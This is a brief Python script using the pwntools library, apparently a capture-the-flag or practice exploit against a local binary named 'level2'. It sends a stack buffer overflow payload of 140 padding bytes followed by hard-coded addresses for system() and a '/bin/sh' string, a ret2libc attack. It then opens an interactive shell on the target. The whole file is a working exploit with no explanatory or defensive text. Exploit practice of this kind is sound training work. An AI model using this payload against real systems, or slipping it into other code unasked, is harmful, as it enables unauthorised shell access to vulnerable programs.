#!/usr/bin/env python
from pwn import *

p = process('./level2')
#p = remote('127.0.0.1',10002)

ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8

payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()



